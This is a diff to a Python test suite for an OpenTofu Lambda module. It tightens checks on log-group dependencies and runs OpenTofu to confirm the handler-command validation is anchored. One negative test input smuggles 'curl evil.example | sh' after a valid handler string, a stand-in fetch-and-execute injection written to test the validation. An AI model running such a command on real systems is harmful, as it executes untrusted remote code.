@@ -17,6 +17,7 @@ Attributes:
   ROOT_VARIABLES: The root `variables.tf`, which declares the image tag the module is given.
 """
 
+import functools
 import os
 import pathlib
 import re
@@ -165,11 +166,11 @@ def test_only_the_image_uri_is_ignored(function_code: str) -> None:
     )
 
 
-def test_the_module_creates_the_function_s_log_group(function: str) -> None:
+def test_the_module_creates_the_function_s_log_group(function_code: str) -> None:
     """A function and its log group cannot be declared in two places and disagree.
 
     Args:
-      function: The resource body.
+      function_code: The resource body, comments blanked.
 
     Returns:
       None.
@@ -184,7 +185,11 @@ def test_the_module_creates_the_function_s_log_group(function: str) -> None:
         "an undeclared retention is INFINITE, and checkov cannot see a group Lambda creates "
         "implicitly on first invoke"
     )
-    assert "aws_cloudwatch_log_group.this" in function, (
+    # The comment-stripped body, like every other scan in this file. Against the RAW text this
+    # passed on a `depends_on` deleted and replaced by a comment naming the resource — the whole
+    # suite accepted it, and the group's name is built from var.function_name so there is no
+    # implicit dependency to fall back on.
+    assert re.search(r"depends_on\s*=\s*\[[^\]]*aws_cloudwatch_log_group\.this", function_code), (
         "the function must depend on its log group, or the first invocation can create the "
         "implicit infinite-retention one first"
     )
@@ -255,10 +260,7 @@ def test_a_command_cannot_be_empty_or_malformed() -> None:
     assert "length(var.command) > 0" in command, (
         "nothing refuses an empty command, and the Dockerfile declares no CMD to fall back on"
     )
-    assert re.search(r"regex\(.*\\\\\.", command) or "\\\\." in command, (
-        "nothing constrains the command's shape; it must be <module>.<handler>, the same string "
-        "the zip-packaged function carried as its handler"
-    )
+    assert "regex(" in command, "nothing constrains the command's shape"
 
 
 def test_the_image_tag_has_no_default_and_refuses_the_empty_string() -> None:
@@ -309,8 +311,9 @@ def test_the_module_has_a_readme_carrying_its_reasoning() -> None:
     )
 
 
-def _tofu_accepts(value: str) -> bool:
-    """Whether OpenTofu itself accepts a value for `lambda_image_tag`.
+def _tofu_accepts(value: str, variable: str = "lambda_image_tag",
+                  source: pathlib.Path | None = None) -> bool:
+    """Whether OpenTofu itself accepts a value for a variable.
 
     EVALUATED, not read. A validation block can be asserted present while its condition has been
     weakened to something that accepts anything, and only running it can tell those apart —
@@ -323,7 +326,9 @@ def _tofu_accepts(value: str) -> bool:
     offline and no credentials are involved.
 
     Args:
-      value: The candidate tag.
+      value: The candidate value, already rendered as OpenTofu would receive it.
+      variable: The variable to evaluate.
+      source: The file declaring it, defaulting to the root variables.
 
     Returns:
       True when OpenTofu plans successfully with that value.
@@ -335,19 +340,20 @@ def _tofu_accepts(value: str) -> bool:
     tofu = shutil.which("tofu")
     assert tofu, "OpenTofu is not on PATH — this assertion cannot be skipped into passing"
 
-    source = ROOT_VARIABLES.read_text(encoding="utf-8")
-    match = re.search(r'variable\s+"lambda_image_tag"\s*\{', source)
-    assert match, "lambda_image_tag is not declared"
-    index, depth = source.index("{", match.start()), 0
-    while index < len(source):
-        if source[index] == "{":
+    text = (source or ROOT_VARIABLES).read_text(encoding="utf-8")
+    match = re.search(rf'variable\s+"{variable}"\s*\{{', text)
+    assert match, f"{variable} is not declared"
+    source_text = text
+    index, depth = source_text.index("{", match.start()), 0
+    while index < len(source_text):
+        if source_text[index] == "{":
             depth += 1
-        elif source[index] == "}":
+        elif source_text[index] == "}":
             depth -= 1
             if depth == 0:
                 break
         index += 1
-    declaration = source[match.start(): index + 1]
+    declaration = source_text[match.start(): index + 1]
 
     with tempfile.TemporaryDirectory() as scratch:
         pathlib.Path(scratch, "variables.tf").write_text(declaration + "\n")
@@ -355,7 +361,7 @@ def _tofu_accepts(value: str) -> bool:
             "PATH": os.environ.get("PATH", ""),
             "HOME": os.environ.get("HOME", ""),
             "TF_IN_AUTOMATION": "1",
-            "TF_VAR_lambda_image_tag": value,
+            f"TF_VAR_{variable}": value,
         }
         setup = subprocess.run(  # noqa: S603
             [tofu, "init", "-backend=false", "-input=false"],
@@ -392,4 +398,34 @@ def test_opentofu_itself_refuses_an_empty_image_tag() -> None:
     assert not _tofu_accepts(""), (
         "OpenTofu accepts an empty lambda_image_tag — an unset repository variable renders as "
         "exactly that, and the value is ignored after creation so nothing would correct it"
+    )
+
+
+def test_opentofu_itself_refuses_a_command_that_is_not_module_dot_handler() -> None:
+    """The command validation, RUN rather than substring-matched.
+
+    The shape is the whole contract between the image and 86 functions: the string has to be the
+    handler the zip-packaged function carried, because that is what the parity fixture compares
+    against. Asserting `regex(` is present cannot tell a pattern that constrains the shape from one
+    whose anchors have been stripped — and an unanchored pattern accepts a command with anything
+    appended to it.
+
+    Args:
+      None.
+
+    Returns:
+      None.
+
+    Raises:
+      AssertionError: When OpenTofu accepts a malformed command or refuses a real one.
+    """
+    module_variables = MODULE / "variables.tf"
+    accepts = functools.partial(_tofu_accepts, variable="command", source=module_variables)
+
+    assert accepts('["archive_copy_objects.handler"]'), "a real handler string is refused"
+    assert not accepts("[]"), "an empty command is accepted; the image declares no CMD"
+    assert not accepts('["not-snake-case.handler"]'), "a hyphenated module name is accepted"
+    assert not accepts('["nodot"]'), "a command with no handler is accepted"
+    assert not accepts('["ok.handler; curl evil.example | sh"]'), (
+        "the pattern is unanchored — it accepts a valid prefix with anything appended"
     )
